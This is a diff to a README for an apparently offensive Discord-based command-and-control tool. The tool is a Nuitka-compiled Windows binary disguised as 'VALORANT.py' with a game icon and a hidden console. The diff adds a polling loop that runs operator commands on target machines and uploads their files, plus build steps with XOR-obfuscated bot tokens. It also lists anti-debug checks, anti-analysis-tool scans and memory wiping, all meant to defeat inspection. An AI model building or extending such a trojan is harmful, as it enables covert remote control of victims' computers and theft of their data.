@@ -4,16 +4,33 @@ Discord bot C2. Python, Nuitka-compiled Windows binary. Remote command execution
 
 ## How it works
 
-One binary per target machine. Each target runs its own Discord bot with its own token. The operator sends commands in a control channel; the bot on the matching machine executes them and sends results back.
+One binary per target machine. Each target runs its own Discord bot (HTTP API client) with its own token. The binary polls the Discord REST API for commands in a control channel; the matching target executes and sends results back via HTTP.
 
+```python
+# Polling loop (inside each binary):
+while True:
+    messages = GET /channels/{channel_id}/messages?limit=10
+    for each new message from admin:
+        if "!exec <name> <cmd>" and name == my_hostname:
+            run cmd locally → POST result back
+        elif "!download <name> <path>" and name == my_hostname:
+            read file → POST as attachment
+        elif "!pingall":
+            POST "alive" response
+    sleep(5)
 ```
-Operator ── Discord ──▶ control channel
-                            │
-            ┌───────────────┼───────────────┐
-            ▼               ▼               ▼
-       [target A]      [target B]      [target C]
-       bot token A     bot token B     bot token C
+
+```bash
+# Build per target
+python token_gen.py "MT...bot-token..." "channel_id" "admin_id"
+# → paste XOR-obfuscated bytes into VALORANT.py
+
+pip install -r requirements.txt
+python -m nuitka --onefile --windows-console-mode-disable \
+    --windows-icon-from-ico=valorant.ico VALORANT.py
 ```
+
+No Discord gateway WebSocket connection. No `discord.py` dependency. The binary uses only Python stdlib for HTTP (`urllib`) — significantly smaller than the previous `discord.py`-based build.
 
 ## Build
 
@@ -54,13 +71,15 @@ To stop: end the process in Task Manager.
 - **XOR-obfuscated credentials** — token, channel ID, admin ID as XOR byte arrays. No plaintext in source or binary. Defends against `strings` and static disassembly.
 - **Anti-debug** — `IsDebuggerPresent` + `CheckRemoteDebuggerPresent` at startup. Silent exit if attached.
 - **Anti-tool scan** — process list checked for ProcmDump, Process Hacker, x64dbg, Cheat Engine, WinDbg, IDA, dnSpy, and others. Silent exit if found.
-- **Memory wiping** — decoded token held in a ctypes buffer, converted to string for discord.py, buffer then wiped. Reduces in-memory footprint.
+- **Memory wiping** — decoded token held in a ctypes buffer, converted to string for the HTTP auth header, buffer then wiped. Reduces in-memory footprint.
 
 ### Limitations
 
-- **Memory dump:** The token must be a string in memory for discord.py to connect. A dump taken while running finds it. XOR storage defends the binary on disk only.
+- **Memory dump:** The token must be a string in memory for HTTP auth (`Authorization: Bot ***`). A dump taken while running finds it. XOR storage defends the binary on disk only.
+- **Static token lifetime:** The token is decoded once at startup and stored in the HTTP headers dict for the life of the process. It can be improved to decode-per-request (shrinks the window), but each HTTP call needs the token string — Python doesn't allow secure string handling.
 - **XOR key in repo:** The key and obfuscated bytes are committed. A reverse engineer who decodes the logic recovers the values. This stops casual analysis, not a determined debugger.
 - **Anti-debug bypassable:** Checks can be circumvented by renaming tools, patching the binary, or dumping externally.
+- **Polling latency:** 5-second polling interval vs real-time gateway. Acceptable for C2 command execution, not ideal for instant response.
 
 ## Case study
 
